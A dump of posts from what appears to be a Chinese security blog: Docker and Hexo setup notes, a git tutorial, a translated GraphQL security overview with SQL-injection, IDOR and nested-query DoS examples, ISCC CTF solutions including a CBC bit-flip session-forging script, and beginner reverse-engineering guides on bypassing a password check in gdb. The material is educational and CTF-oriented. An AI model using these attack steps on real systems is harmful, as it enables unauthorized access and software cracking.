ctf","slug":"writeup-ctf","permalink":"https://threst.github.io/tags/writeup-ctf/"}]},{"title":"kali下安装docker","slug":"kali安装docker","date":"2018-05-29T12:33:09.000Z","updated":"2018-05-30T14:35:17.620Z","comments":true,"path":"2018/05/29/kali安装docker/","link":"","permalink":"https://threst.github.io/2018/05/29/kali安装docker/","excerpt":"","text":"周末水了下suctf，只做出签到题，太菜了，今天在安全客上面梅子酒师傅发出了wp，看了之后觉得质量非常高，最重要的是可以在docker上复现，发现现在kali上面并没有安装docker，之前在知乎上面写过一篇关于如何安装docker的文章，于是晚上试了下，尴尬的是失败了！！google了下，喜获一个一键安装脚本，看了下大佬脚本发现可能是apt-get install docker-ce这个的问题，因为之前一直是apt-cache policy docker-engine 之前的安装方式由于kali linux是基于Debian Wheezy，所以这里docker需要的内核版本至少是3.10，因此需要检查下kali的内核，如果不够的话，需要更新内核uname -a切换用户root下 1.创建/etc/apt/sources.list.d/backports.listleafpad /etc/apt/sources.list.d/backports.list 2.在list文件里加上一条反向端口条目deb http://http.debian.net/debian wheezy-backports main 3.更新软件包apt update 4.如果以前安装过docker就这样删除所有旧版本docker apt-get purge lxc-docker* apt-get purge docker.io* 可能没有旧版本（之前没有安装过）没有的继续 5.确认apt添加了https方法和CA cerificatesapt-get install apt-transport-https ca-certificates gnupg2 6.添加一个新的GPG keyapt-key adv --keyserver hkp://ha.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D 7.安装repositoryapt-cache policy docker-engine这个命令可以查看是否存在资源之后再apt-get install docker-engine但是这个好像不行了要执行下列命令apt-get install docker-ce 一键安装脚本#!/bin/bash # install dependencies sudo apt-get install apt-transport-https ca-certificates curl gnupg software-properties-common dirmngr # use https get sources sudo echo &quot;deb https://http.kali.org/kali kali-rolling main non-free contrib&quot; &gt; /etc/apt/sources.list sudo echo &quot;deb-src https://http.kali.org/kali kali-rolling main non-free contrib&quot; &gt;&gt; /etc/apt/sources.list # update apt-get export DEBIAN_FRONTEND=&quot;noninteractive&quot; sudo apt-get update # remove previously installed Docker sudo apt-get purge lxc-docker* sudo apt-get purge docker.io* # add Docker repo gpg key curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add - # add deb docker sources sudo echo &quot;deb [arch=amd64] https://download.docker.com/linux/debian stretch stable&quot; &gt;&gt; /etc/apt/sources.list cat &gt; /etc/apt/sources.list.d/docker.list &lt;&lt;&apos;EOF&apos; deb https://apt.dockerproject.org/repo debian-stretch main EOF sudo apt-get update # install Docker sudo apt-get install docker-ce # run Hellow World image sudo docker run hello-world # manage Docker as a non-root user sudo groupadd docker sudo usermod -aG docker $USER # configure Docker to start on boot sudo systemctl enable docker 脚本地址 测试:root@kali:/home/threst# docker run hello-world出现下面这个就是安装成功了 Hello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal. To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bash Share images, automate workflows, and more with a free Docker ID: https://hub.docker.com/ For more examples and ideas, visit: https://docs.docker.com/engine/userguide/ 使用国内镜像:docker pull registry.docker-cn.com/myname/myrepo:mytag例如docker pull registry.docker-cn.com/suctf/2018-web-annonymous","categories":[],"tags":[{"name":"kali docker","slug":"kali-docker","permalink":"https://threst.github.io/tags/kali-docker/"}]},{"title":"你肯定不知道的GraphQL安全概述和测试技巧","slug":"你肯定不知道的GraphQL安全概述和测试技巧","date":"2018-05-22T09:33:09.000Z","updated":"2018-05-22T14:32:49.122Z","comments":true,"path":"2018/05/22/你肯定不知道的GraphQL安全概述和测试技巧/","link":"","permalink":"https://threst.github.io/2018/05/22/你肯定不知道的GraphQL安全概述和测试技巧/","excerpt":"","text":"写在前面的话随着GraphQL技术的日益普及，我们总结了一些关于常见安全错误的文档和提示。 什么是GraphQL？GraphQL是由Facebook开发并于2015年公开发布的数据查询语言。它是REST API的替代品。 即使你没有看到任何GraphQL在那里，很可能你已经在使用它，因为它是在一些大的科技巨头，Facebook, GitHub, Pinterest, Twitter, HackerOne更多。 这项技术的几个关键点1.GraphQL提供了API中数据的完整和可理解的描述，并使客户能够精确地询问他们需要什么。返回可预测的结果。2.典型的RESTAPI需要从多个URL进行加载，但GraphQLAPI可以在单个请求中获取应用程序所需的所有数据。3.GraphQL api是按照类型和字段而不是端点来组织的,您可以从单个端点访问所有数据的全部功能。4.GraphQL是强类型的，以确保应用程序只询问可能的情况并提供明确而有用的错误。5.新的字段和类型可以添加到GraphQL API，而不会影响现有的查询。老化的字段可以被弃用，并且隐藏在工具中。 在开始深入研究GraphQL安全领域之前，下面简要回顾它的工作原理。该官方文档写得很好，是真正有用的。 一个GraphQL查询如下所示：基本的GraphQL查询 query{ user{ id email firstName lastName } } 尽管响应是JSON：基本的GraphQL响应 { &quot;data&quot;: { &quot;user&quot;: { &quot;id&quot;: &quot;1&quot;, &quot;email&quot;: &quot;paolo@doyensec.com&quot;, &quot;firstName&quot;: &quot;Paolo&quot;, &quot;lastName&quot;: &quot;Stagno&quot; } } } 安全测试技巧由于Burp Suite不太了解GraphQL语法，因此我建议使用graphql-ide，这是一个基于Electron的应用程序，允许您编辑和发送请求至GraphQL端点; 我还编写了一个小python脚本GraphQL_Introspection.py，它列举了一个GraphQL端点（带有内省），以便提取文档。该脚本对于检查GraphQL模式寻找信息泄露，隐藏数据和不可访问的字段非常有用。 该工具将生成类似于以下内容的HTML报告： 内省是用来要求一个GraphQL模式来获取关于它所支持的查询、类型等信息的信息。 作为一个渗透测试人员，我建议你去寻找发给“/ graphql”或“/graphql.php”的请求，因为这些是通常的GraphQL端点名称; 您还应搜索“/ graphiql”，“graphql / console /”，联机GraphQL IDE与后端交互，以及“/graphql.php?debug=1”（带有附加错误报告的调试模式），因为它们可能会被留下由开发人员开放。 在测试应用程序时，验证是否可以在没有通常授权令牌标头的情况下发出请求： 由于GraphQL框架没有提供任何保护数据的手段，因此开发人员因按照文档中的说明实施访问控制： “但是，对于生产代码库，将授权逻辑委托给业务逻辑层”。 任何事情都可能会出错，因此没有正确认证和或授权的用户是否可以从服务器请求整个底层数据库非常重要。当使用GraphQL构建应用程序时，开发人员必须将数据映射到他们选择的数据库技术中的查询。这是易于引入安全漏洞的原因，导致 破坏访问控制，不安全的直接对象引用甚至SQL / NoSQL注入。 作为破坏实现的一个示例，以下请求 / 响应表明我们可以为平台的任何用户（通过ID参数循环访存）获取数据，同时转储密码哈希值： 询问 query{ user(id: 165274){ id email firstName lastName password } } 响应 { &quot;data&quot;: { &quot;user&quot;: { &quot;id&quot;: &quot;165274&quot;, &quot;email&quot;: &quot;johndoe@mail.com&quot;, &quot;firstName&quot;: &quot;John&quot;, &quot;lastName&quot;: &quot;Doe&quot; &quot;password&quot;: &quot;5F4DCC3B5AA765D61D8327DEB882CF99&quot; } } } 您需要检查的另一件事与尝试执行非法查询时的信息泄露有关：信息披露 { &quot;errors&quot;: [ { &quot;message&quot;: &quot;Invalid ID.&quot;, &quot;locations&quot;: [ { &quot;line&quot;: 2, &quot;column&quot;: 12 } &quot;Stack&quot;: &quot;Error: invalid ID\\n at (/var/www/examples/04-bank/graphql.php)\\n&quot; ] } ] } 虽然GraphQL是强类型的，但SQL / NoSQL注入仍然是可能的，因为GraphQL只是客户端应用程序和数据库之间的一个层。问题可能存在于为了查询数据库而从GraphQL查询中获取变量的层中，未正确清理的变量导致旧的简单SQL注入。在Mongodb的情况下，NoSQL注入可能并不那么简单，因为我们不能”juggle”类型（例如将字符串转换为数组，请参阅PHP MongoDB注入）。 GraphQL SQL注入 mutation search($filters Filters!){ authors(filter: $filters) viewer{ id email firstName lastName } } { &quot;filters&quot;:{ &quot;username&quot;:&quot;paolo&apos; or 1=1--&quot; &quot;minstories&quot;:0 } } 谨防嵌套查询！它们可以允许恶意客户端通过过度复杂的查询来执行DoS（拒绝服务）攻击，这些查询会占用服务器的所有资源： 嵌套查询 query { stories{ title body comments{ comment author{ comments{ author{ comments{ comment author{ comments{ comment author{ comments{ comment author{ name } } } } } } } } } } } } 可能设置超时，最大深度或查询复杂度阈值来针对DoS进行简单补救请记住，在PHP GraphQL实现中：复杂性分析默认是禁用的限制查询深度默认情况下处于禁用状态自省是默认启用的。这意味着任何人都可以通过发送包含元字段类型和模式的特殊查询来完整描述您的模式 结尾GraphQL是一项新的有趣的技术，可用于构建安全的应用程序。由于开发人员负责实施访问控制，因此应用程序很容易出现经典的Web应用程序漏洞，如Broken Access Controls，不安全的直接对象引用，跨站点脚本（XSS）和经典注入漏洞。就像任何技术一样，基于GraphQL的应用程序可能会像这个实际例子那样容易出现开发实现错误： “通过使用脚本，整个国家（我用美国，英国和加拿大测试过的）可能的号码组合都可以通过这些URL运行，并且如果一个号码与Facebook帐户相关联，则它可以与名称和更多细节（图像等）。“ 参考:https://en.wikipedia.org/wiki/GraphQLhttps://dev-blog.apollodata.com/the-concepts-of-graphql-bc68bd819be3https://graphql.org/learn/https://www.howtographql.com/https://www.hackerone.com/blog/the-30-thousand-dollar-gem-part-1https://hackerone.com/reports/291531https://labs.detectify.com/2018/03/14/graphql-abuse/https://medium.com/the-graphqlhub/graphql-and-authentication-b73aed34bbebhttp://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/https://webonyx.github.io/graphql-php/ 本文翻译:https://blog.doyensec.com/2018/05/17/graphql-security-overview.html","categories":[],"tags":[{"name":"安全客弃婴","slug":"安全客弃婴","permalink":"https://threst.github.io/tags/安全客弃婴/"}]},{"title":"git一条龙(一看就会的那种)","slug":"git一条龙(一看就会的那种)","date":"2018-05-17T12:33:09.000Z","updated":"2018-05-17T12:51:32.325Z","comments":true,"path":"2018/05/17/git一条龙(一看就会的那种)/","link":"","permalink":"https://threst.github.io/2018/05/17/git一条龙(一看就会的那种)/","excerpt":"","text":"0x00安装gitlinux一般自带，windows访问以下链接https://git-scm.com/downloads然后去github上去注册一个帐号 0x01创建版本库1.新建文件夹随便新建一个文件夹 2.将目录变成Git可以管理的仓库初始化一个Git仓库,鼠标右键打开git bash，输入以下命令git init 3.添加文件到git仓库首先随便你写个要添加至git仓库的文件 第一步，使用命令`git add 随便什么文件名`，注意，可反复多次使用，添加多个文件； 第二步，使用命令`git commit`，完成。 添加远程库添加ssh在用户主目录下，看看有没有.ssh目录，如果有，再看看这个目录下有没有id_rsa和id_rsa.pub这两个文件，如果已经有了，可直接跳到下一步。如果没有，打开Shell（Windows下打开Git Bash），创建SSH Key：ssh-keygen -t rsa -C &quot;youremail@example.com&quot;如果一切顺利的话，可以在用户主目录里找到.ssh目录，里面有id_rsa和id_rsa.pub两个文件，这两个就是SSH Key的秘钥对，id_rsa是私钥，不能泄露出去，id_rsa.pub是公钥，可以放心地告诉任何人 登陆GitHub，打开“Account settings”，“SSH Keys”页面：然后，点“Add SSH Key”，填上任意Title，在Key文本框里粘贴id_rsa.pub文件的内容： 关联一个远程库git remote add origin git@github.com:你github账户名/刚才创的项目名.git 关联后，使用命令git push -u origin master第一次推送master分支的所有内容； 具体如何操作？添加文件到git仓库首先随便你写个要添加至git仓库的文件 第一步，使用命令git add 随便什么文件名，注意，可反复多次使用，添加多个文件；第二步，使用命令git commit，完成。第三步，使用命令git push -u origin master推送到分支中在第三步之前，可以git checkout -b xxx创建xxx分支为你所用 其他命令git checkout -b xxx：新建xxx分支 git checkout命令加上-b参数表示创建并切换，相当于以下两条命令： git branch xxx git checkout xxx` git branch：查看处于那个分支git checkout master：切换master分支git merge xxx：将xxx分支合并master分支,git merge命令用于合并指定分支到当前分支。git branch -d xxx：删除xxx分支要关联一个远程库，使用命令git remote add origin git@server-name:path/repo-name.git；关联后，使用命令git push -u origin xxx第一次推送master分支的所有内容；此后，每次本地提交后，只要有必要，就可以使用命令git push origin xxx推送最新修改； https://backlog.com/git-tutorial/cn/http://www.runoob.com/git/git-tutorial.htmlhttps://github.com/xirong/my-git/blob/master/ixirong.com.mdhttp://www.nafnafa.com/archives/33","categories":[],"tags":[{"name":"git","slug":"git","permalink":"https://threst.github.io/tags/git/"}]},{"title":"isccwp","slug":"isccwp","date":"2018-05-12T09:33:09.000Z","updated":"2018-05-21T14:22:38.738Z","comments":true,"path":"2018/05/12/isccwp/","link":"","permalink":"https://threst.github.io/2018/05/12/isccwp/","excerpt":"","text":"iscchashdump长度碰撞&lt;?php include &quot;secret.php&quot;;` @$username=(string)$_POST[&apos;username&apos;]; function enc($text){ global $key; return md5($key.$text); } if(enc($username) === $_COOKIE[&apos;verify&apos;]){ if(is_numeric(strpos($username, &quot;admin&quot;))){ die($flag); } else{ die(&quot;you are not admin&quot;); } } else{ setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7); setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7); } show_source(__FILE__); 要要注意这个$key的长度根据返回包的len参数为46,所以hashdump长度输入46,在本地测试可以把inlcude这行删掉，自己定义$key,$flag 逆向第一题[原题wp]：(https://blog.csdn.net/xiangshangbashaonian/article/details/79575062) openssl rsa -pubin -text -modulus -in warmup -in public.key Public-Key: (256 bit) Modulus: 00:d9:9e:95:22:96:a6:d9:60:df:c2:50:4a:ba:54: 5b:94:42:d6:0a:7b:9e:93:0a:ff:45:1c:78:ec:55: d5:55:eb Exponent: 65537 (0x10001) Modulus=D99E952296A6D960DFC2504ABA545B9442D60A7B9E930AFF451C78EC55D555EB writing RSA key -----BEGIN PUBLIC KEY----- MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhANmelSKWptlg38JQSrpUW5RC1gp7npMK /0UceOxV1VXrAgMBAAE= -----END PUBLIC KEY-----` python一下 a = 0xd99e952296a6d960dfc2504aba545b9442d60a7b9e930aff451c78ec55d555eb print a = 98432079271513130981267919056149161631892822707167177858831841699521774310891L 放到这个[网站]上面试试分解(http://factordb.com/index.php)最终代码: #coding:utf-8 import gmpy import rsa p = 302825536744096741518546212761194311477 q = 325045504186436346209877301320131277983 n = 98432079271513130981267919056149161631892822707167177858831841699521774310891 e = 65537 d = int(gmpy.invert(e , (p-1) * (q-1))) privatekey = rsa.PrivateKey(n , e , d , p , q) #根据已知参数，计算私钥 with open(&quot;encrypted.message1&quot; , &quot;rb&quot;) as f: print(rsa.decrypt(f.read(), privatekey).decode()) #使用私钥对密文进行解密，并打印 with open(&quot;encrypted.message2&quot; , &quot;rb&quot;) as f: print(rsa.decrypt(f.read(), privatekey).decode()) #使用私钥对密文进行解密，并打印 with open(&quot;encrypted.message3&quot; , &quot;rb&quot;) as f: print(rsa.decrypt(f.read(), privatekey).decode()) #使用私钥对密文进行解密，并打印 iscc cbc翻转攻击打开网页查看注释提示tips:index.txt打开index.txt看到源码，审计一波 &lt;?php include &apos;sqlwaf.php&apos;; define(&quot;SECRET_KEY&quot;, &quot;................&quot;); define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;); session_start(); function get_random_iv(){ $iv=&apos;&apos;; for($i=0;$i&lt;16;$i++){ $iv.=chr(rand(1,255)); } return $iv; } function login($info){ $iv=get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;]; setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher)); } function show_homepage(){ if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;){ echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;; echo &apos;&lt;p&gt;Flag is ****&lt;/p&gt;&apos;; }else{ echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;; echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;; } echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;; die(); } function check_login(){ if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;])){ $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){ $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;); $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;]; }else{ die(&quot;ERROR!&quot;); } } } if (isset($_POST[&apos;username&apos;])&amp;&amp;isset($_POST[&apos;password&apos;])) { $username=waf((string)$_POST[&apos;username&apos;]); $password=waf((string)$_POST[&apos;password&apos;]); if($username === &apos;admin&apos;){ exit(&apos;&lt;p&gt;You are not real admin!&lt;/p&gt;&apos;); }else{ $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password); login($info); show_homepage(); } } else{ if(isset($_SESSION[&quot;username&quot;])){ check_login(); show_homepage(); } } ?&gt; 开始我们尝试直接username=admin，password=admin结果输出You are not real admin! 因为这行代码判断username不能为admin if($username === ‘admin’){ exit(‘You are not real admin!‘);此题与这题相似存在index.php.swp，vim -r index.php.swp继续iscc首先发送xdmin，12345，在返回包里存在iv，cipher参数 import base64 import requests import urllib iv_raw=&apos;%2F8iEm4jh%2BjbgVGwlQ31ycg%3D%3D&apos; #这里填写第一次返回的iv值 cipher_raw=&apos;8WdhbPxjZy9xYAgoCeghiOUQu0ri1Y3dv7cX44MbvOfIC6zZxCbR%2FPFpeMatL5qIgT%2BYA66tIdCBpxtWsWxV9Q%3D%3D&apos; #这里填写第一次返回的cipher值 print &quot;[*]原始iv和cipher&quot; print &quot;iv_raw: &quot; + iv_raw print &quot;cipher_raw: &quot; + cipher_raw print &quot;[*]对cipher解码，进行反转&quot; cipher = base64.b64decode(urllib.unquote(cipher_raw)) #a:2:{s:8:&quot;username&quot;;s:5:&quot;zdmin&quot;;s:8:&quot;password&quot;;s:5:&quot;12345&quot;} #s:2:{s:8:&quot;userna #me&quot;;s:5:&quot;zdmin&quot;; #s:8:&quot;password&quot;;s #:3:&quot;12345&quot;;} xor_cipher = cipher[0:9] + chr(ord(cipher[9]) ^ ord(&apos;m&apos;) ^ ord(&apos;a&apos;)) + cipher[10:] #请根据你的输入自行更改，原理看上面的介绍 xor_cipher=urllib.quote(base64.b64encode(xor_cipher)) print &quot;反转后的cipher：&quot; + xor_cipherost 包中的cookie中添加iv，cipher，iv的参数用放回包中的，cipher使用反转后的cipher，再发包可以看见返回包中有串base64_decode() import base64 import urllib cipher = &apos;Bc6oENSSAEPpPdv/rbqRZG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9&apos;#填写提交后所得的无法反序列化密文 iv = &apos;%2F8iEm4jh%2BjbgVGwlQ31ycg%3D%3D&apos;#一开始提交的iv #cipher = urllib.unquote(cipher) cipher = base64.b64decode(cipher) iv = base64.b64decode(urllib.unquote(iv)) newIv = &apos;&apos; right = &apos;a:2:{s:8:&quot;userna&apos;#被损坏前正确的明文 for i in range(16): newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i])) #这一步相当于把原来iv中不匹配的部分修改过来 print urllib.quote(base64.b64encode(newIv)) 解密这串base64,加到iv参数中，再post，出flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://threst.github.io/tags/writeup/"}]},{"title":"艰难的hexo上线","slug":"艰难的hexo上线","date":"2018-05-12T09:33:09.000Z","updated":"2018-05-17T13:08:05.146Z","comments":true,"path":"2018/05/12/艰难的hexo上线/","link":"","permalink":"https://threst.github.io/2018/05/12/艰难的hexo上线/","excerpt":"","text":"我就是那个触发了这一切的错漏。漏洞不仅仅是个错误，这还说明有更大的问题。思想上的纰漏，说明了你是个怎么样的人。永远不给他们看我的源代码，只有这样才能保护我自己。封闭自己，创造出冰冷而完美的迷宫，没人能找到我。从现在开始，过一种没有漏洞的生活，不惜一切地保护我的完美迷宫。 《Mr Robot》S01 《黑客军团》第1季 写在前面的话之前一直想搭个博客记录一下学习,也算是监督,办域名弄空间太麻烦了,于是打算就是使用github+hexo搭个静态的. kali下的尝试在网上搜了下全是关于windows和mac下的,并没有linux下的,更别说kali,要搭hexo首先要以下条件:1.nodejs2.git3.hexo开始发现kali自带nodejs,大喜!但是喜不过三秒,npm命令找不到,各种尝试,个个失败:(突然发现可以重装node,于是卸载node,然后又在弄npm和node的链接,npm install -g cnpm --registry=https://registry.npm.taobao.orgnpm install hexo-cli -gcd /node-v4.9.1-linux-x64/lib/node_modules/hexo-cli/bin./hexo -v终于有hexo了hexo -init提示not empty, please run hexo init on an empty folder and then copy your files into itsudo ln -s /home/threst/node-v4.9.1-linux-x64/lib/node_modules/hexo-cli/bin /hexo /usr/local/bin/hexomkdir hexocd hexohexo init创建好了，可是使用npm install没有回显提示hexo失败!!!! win7尝试因为去装了个移动硬盘原来那个kali系统不用了,所以要重新安装虚拟机,这里又是个坑,虚拟机各种报错,后来发现没有apt upgrade 正式安装1.下载git,nodejs2.github创建gitpage项目3.npm install hexo -g4.hexo -v检查是否安装成功5.新建hexo文件夹,进入hexo init安装hexo6.npm install7.在hexo文件夹中右键,git bash8.git config --global user.name &quot;threst&quot; git config --global user.email &quot;qq.com&quot;9.ssh-keygen -t rsa -C &quot;qq.com&quot;10.在github中添加ssh key,输入id_rsa.pub11.ssh -T git@github.com The authenticity of host ‘github.com (13.250.177.223)’ can’t be established.RSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added ‘github.com,13.250.177.223’ (RSA) to the list of known hosts.Hi threst! You’ve successfully authenticated, but GitHub does not provide shell access. ssh可以连接这里又是个坑,hexo d的时候总是传不到github上去,只有本地有,问了些大佬,都没这种问题,后来发现repo有两种方式,只有这种可以,之前试的是https://threst/threst.github.io.gitdeploy: type: git repo: git@github.com:threst/threst.github.io.git branch: master13.提示ERROR Deployer not found: gitnpm install hexo-deployer-git --save14.hexo clean hexo g hexo d测试0k 安装主题在hexo文件夹中打开gitbashnpm install hexo-generator-json-content --save &amp;&amp; git clone https://github.com/fi3ework/hexo-theme-archer.git themes/archer在_config.yml中设置theme: archer 最后的坑1.主题中_config的图片不用加引号2.favion我没有写所以在_config中把那行直接去掉,而不是不填这两点都可导致页面打开404或空白(重装5遍)","categories":[],"tags":[]},{"title":"逆向入门--linux64","slug":"逆向工程基础 - Linux x64","date":"2018-05-12T09:33:09.000Z","updated":"2018-05-13T14:27:12.061Z","comments":true,"path":"2018/05/12/逆向工程基础 - Linux x64/","link":"","permalink":"https://threst.github.io/2018/05/12/逆向工程基础 - Linux x64/","excerpt":"","text":"序幕这个Ground Zero系列适合初学者入门使用，让他们进入逆向工程领域。因为这是x64的时代，所以我跳过了x86体系结构。但是你要知道，所有将用c++编写的示例也可以编译为x86，但是我将把它作为作业留给你们。如果你没有任何经验，也无所谓了。你唯一需要的就是有对编程语言的基本理解。开始时，我们将编写一个简单的c++程序，它将提示用户输入密码。它将检查密码是否匹配，如果它正确，它将提示正确，否则将提示错误。我举这个例子的主要原因是，这个例子将让你了解jump，以及其他类似的条件在汇编语言中是如何工作的。另一个原因是，大多数具有硬编码键的程序都可以用类似的方式破解，只不过需要更多的数学知识，而这正是大多数盗版分销商如何破解合法软件并传播密钥的方式。让我们先了解一下我们编写的c++程序。所有的代码都将托管在我的Github页面中：https://github.com/paranoidninja/ScriptDotSh-Reverse-Engineering 这里的代码非常简单。我们的程序将一个参数作为密码输入，如果我不输入任何密码，它将打印help命令。如果我指定了一个密码，它会以10个字节的字符形式存储，并将密码发送到check_pass()函数。我们的硬编码密码是check_pass()函数中的PASSWORD1。在这里，我们的密码与strcmp90函数的实际密码变量mypass进行比较。如果密码匹配，则返回零，否则返回1。返回到我们的主功能，如果我们接收到1，它会打印错误的密码，否则会打印正确的密码。 现在，让我们在GDB调试器中找到这个代码。用GDB执行二进制文件，将首先在main中设置一个断点，然后再发送参数。其次，我们会让enable time在我们的GDB上运行，所以如果我们走错了一步，我们可以逆转这一步。这可以通过以下命令完成：target record-full和reverse-stepi / nexti 如果你不明白这一点，问题不大。你只需关注gdb $部分，就像你上面看到的那样，在给断点使用break main之后，我输了一个错误的密码pass123。我的编译过的代码应该如前所述打印一个不正确的密码，但是随着我们继续，我们会找到两种方法来绕过代码; 一种是通过从内存中取出实际密码，二是通过修改跳转值并打印密码正确。 反汇编下一步是反汇编整个代码，看看到底发生了什么： 我们在整个反汇编代码中的主要关注以下几点： 1.je - je表示如果相等就跳转到某个地址，如果不相等，继续下一步。2.call-调用一个新的函数。请记住，在加载完成后，反汇编代码将从主反汇编函数更改为新函数的反汇编代码。 test - 检查两个值是否相等 cmp- 比较两个值 JNE - 如果它不等于某物，jne就意味着跳转。否则，继续下一步。 有些人可能会问，既然我们有cmp，我们为什么要进行test呢?答案可以在这里找到，解释得很漂亮:https://stackoverflow.com/questions/39556649/linux-assembly-whats-difference-between-test-eax-eax-and-cmp-eax-0 所以，如果我们看到上面的反汇编代码，我们知道如果我们运行没有密码或参数的二进制文件，它将打印帮助，否则将继续检查密码。所以这个cmp应该是检查我们是否有参数的部分。如果一个参数不存在，它将继续打印帮助，否则它将跳转到&lt;main + 70&gt;。如果你在左边的地址旁边看到那些数字，我们可以看到在&lt;+70&gt;处，我们正在将某些东西移动到rax寄存器中。所以，我们要做的是我们将在je上设置一个断点，方法是指定它的地址0x0000000000400972，然后看看它是跳转到&lt;+70&gt;通过要求它继续c。GDB命令c将继续运行二进制文件，直到遇到另一个断点。 而现在，如果您执行的是step迭代的stepi，它将执行一次迭代执行，并且它应该将您带到&lt;+70&gt;它将Quad Word移入rax寄存器的位置。 我们的逻辑到现在为止都是正确的，现在我们来看下一个有趣的东西，也就是调用部分。如果你看到它旁边，它上面写着类似于&lt;_Z10check_passPc&gt;，它就是我们的check_pass()函数。让我们跳到使用stepi，看看函数里面是什么。一旦你跳到check_pass()函数并反汇编它，你会看到一组新的反汇编代码，它就是check_pass()函数本身的代码。这里有四行有趣的代码： 第一部分是将rdx寄存器的值移至rsi并将rax移至rdi。下一部分是调用strcmp()函数，它是C ++的字符串比较函数。接下来，我们有测试这两个值进行比较，如果这两个值相等，我们跳（JE）到&lt;_Z10check_passPc + 77&gt;将0移动到EAX寄存器。如果值不相等，函数将继续在&lt;+70&gt;处继续并在eax寄存器赋值1。现在，这些只不过是我们先前在check_pass()函数中指定的返回值。由于我们输入了无效密码，将发送的返回值为1。但是如果我们可以将返回值修改为零，那么它将输出为“正确的密码”。 另外，我们可以继续检查被移动到rsi和rdi寄存器中的内容。所以，让我们在那里放置一个断点并直接跳到它。 从上图可以看出，我使用了x / s $ rdx和x / s $ rax命令从寄存器中获取值。x / s表示检查寄存器并将其显示为一个字符串。如果你想以字节为单位获得它，你可以指定x / b，或者如果你想要字符，你可以指定x / c等等。然而，有多种变化。现在我们获取密码的第一部分已经在这里了。但是，让我们看看我们如何将&lt;_Z10check_passPc + 70&gt;处的返回值修改为零。所以，我们会拍摄stepi并跳到这个迭代。 结语正如您在上面看到的，函数在二进制中将0x1移到eax，但是在它可以做一个je之前，我们使用set $eax = 0x0将值修改为0x0，然后继续使用c作为下面的函数，瞧!!!我们有一个返回的值作为正确的密码! 这只是一个简单的例子，让您开始逆向工程。随着我们深入，我们将看到套接字函数，运行时加密，编码隐藏的域名等等。这整个过程可以在Windows中使用Olly调试器完成，我将在下一篇博文中展示。 原文地址:https://scriptdotsh.com/index.php/2018/04/09/ground-zero-part-1-reverse-engineering-basics/","categories":[],"tags":[{"name":"安全客弃婴","slug":"安全客弃婴","permalink":"https://threst.github.io/tags/安全客弃婴/"}]},{"title":"逆向入门--ARM64的linux","slug":"逆向工程入门— ARM64上的Linux","date":"2018-05-12T09:33:09.000Z","updated":"2018-05-13T14:31:40.124Z","comments":true,"path":"2018/05/12/逆向工程入门— ARM64上的Linux/","link":"","permalink":"https://threst.github.io/2018/05/12/逆向工程入门— ARM64上的Linux/","excerpt":"","text":"序幕正如您知道的那样，ARM为我们周围的各种低功耗设备供电，包括但不限于电话，路由器，物联网设备等。因此，深入研究这种体系结构并理解它与x86和x64体系结构有何不同之处是合理的。对于这篇文章，我们将重点介绍目前最常用的64位ARM CPU。我们的设备包括ARM Cortex-A53 CPU的Ubuntu 16.04，它支持32位和64位指令集。 在之前的文章中，我们逆向了x64Linux和Windows中的C++二进制文件。在这篇文章中，我们将会使用同样的程序，但用c语言重写。 编译程序：$ gcc crack_me.c -o crack_me ####二进制信息： 反编译现在让我们用启动GDB二进制并开始分析。请注意，我使用GEF（https://github.com/hugsy/gef）和GDB，所以我的提示符看起来像gef&gt;而不是gdb&gt;。我们先分解一下主要功能。 $ gdb ./crack_me gef&gt; disas main 我们的注意力直接转向&lt;main + 64&gt;处的&lt;check_pass&gt;函数，但在之前，您可能需要花点时间并理解这些指令的含义。您可以在ARM的文档（https://developer.arm.com/docs/100069/latest/a64-general-instructions）上阅读更多关于这些内容的信息。以下是对我们的分析很重要的一些说明。 b -分支到标签，类似于jmp语句bl -分支到链接到标签，类似于调用语句b.ne -分支到标签，如果不相等，类似于jne语句b.eq -分支到标签，如果相等，类似于je声明 让我们深入汇编代码。编号是指在gdb反汇编输出中突出显示的部分。 1.在地址0x4007bc， &lt;main+4&gt;，堆栈指针（SP）寄存器是MOV 